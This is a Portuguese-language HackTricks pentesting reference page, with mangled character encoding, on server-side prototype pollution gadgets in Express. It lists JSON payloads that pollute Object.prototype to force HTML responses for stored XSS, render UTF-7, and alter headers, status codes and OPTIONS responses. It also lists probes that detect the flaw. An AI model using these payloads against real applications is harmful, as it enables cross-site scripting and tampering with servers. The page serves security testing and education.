# Gadgets de Polui√ß√£o de Prot√≥tipo do Express

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Servir respostas XSS

### Alterar o tipo de conte√∫do JSON para HTML

Em um aplicativo Express que usa uma **resposta de tipo de conte√∫do JSON** e reflete um JSON:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
    _.merge({}, req.body);
   res.send(req.body);
});
```
Nesses casos, normalmente n√£o √© poss√≠vel realizar XSS com um tipo de conte√∫do JSON. No entanto, com a polui√ß√£o de prot√≥tipos, podemos **confundir o Express para servir uma resposta HTML**. Essa vulnerabilidade depende da aplica√ß√£o usar **`res.send(obj)`** e usar o analisador de corpo com o tipo de conte√∫do application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
Ao **poluir** as propriedades **`body`** e **`_body`**, √© poss√≠vel fazer com que o **Express sirva o tipo de conte√∫do HTML** e reflita a propriedade `_body`, resultando em XSS armazenado.

### Renderizar UTF7

√â poss√≠vel fazer o express **renderizar conte√∫do UTF-7 com**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## T√©cnicas de Escaneamento Seguro

### Espa√ßos em JSON

O seguinte PP far√° com que os atributos dentro de um JSON tenham um espa√ßo extra que n√£o quebrar√° a funcionalidade:
```json
{"__proto__":{"json spaces": " "}}
```
Ent√£o um JSON refletido ficar√° assim:
```json
{"foo":  "bar"} -- Note the extra space
```
### Cabe√ßalhos Expostos

O seguinte gadget PP far√° com que o servidor envie de volta o cabe√ßalho HTTP: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
√â necess√°rio que o **m√≥dulo CORS esteja instalado**.

### **M√©todo OPTIONS**

Com a seguinte carga √∫til, √© poss√≠vel **ocultar um m√©todo de uma resposta OPTIONS**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Status**

√â poss√≠vel alterar o **c√≥digo de status retornado** usando o seguinte payload PP:
```json
{"__proto__":{"status":510}}
```
### Erro

Quando voc√™ atribui a um prot√≥tipo um valor primitivo, como uma string, isso produz uma **opera√ß√£o sem efeito, j√° que o prot√≥tipo deve ser um objeto**. Se voc√™ tentar atribuir um objeto prot√≥tipo ao `Object.prototype` em si, isso ir√° **gerar uma exce√ß√£o**. Podemos usar esses dois comportamentos para **detectar se a polui√ß√£o de prot√≥tipo foi bem-sucedida**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Valor Refletido

Se a aplica√ß√£o estiver refletindo um objeto na resposta, voc√™ pode simplesmente criar um atributo com um **nome estranho e o `__proto__`** e se **apenas o estranho for refletido**, √© poss√≠vel que a aplica√ß√£o web seja vulner√°vel:
```json
{"hacktricks":"rocks","__proto__":"test"}
```
Ou se o Lodash ou uma biblioteca similar for usada, voc√™ pode **definir uma propriedade via PP dentro do objeto** e se essa propriedade n√£o for refletida √© porque o Lodash olha para o objeto atual para ver se a propriedade j√° existe no objeto mesclado:
```javascript
{"__proto__":{"a":"asd"},"a":"asd2","b":"dfg"}
// If only b is reflected then PP in Lodash
```
## Misc

### Permitir Pontos

Existe uma op√ß√£o no Express que permite **criar objetos a partir de par√¢metros de string de consulta**.\
Voc√™ pode definitivamente us√°-lo em uma **cadeia** de bugs para explorar uma vulnerabilidade de **polui√ß√£o de prot√≥tipo**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` cria um objeto no Node.**

## Refer√™ncias

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
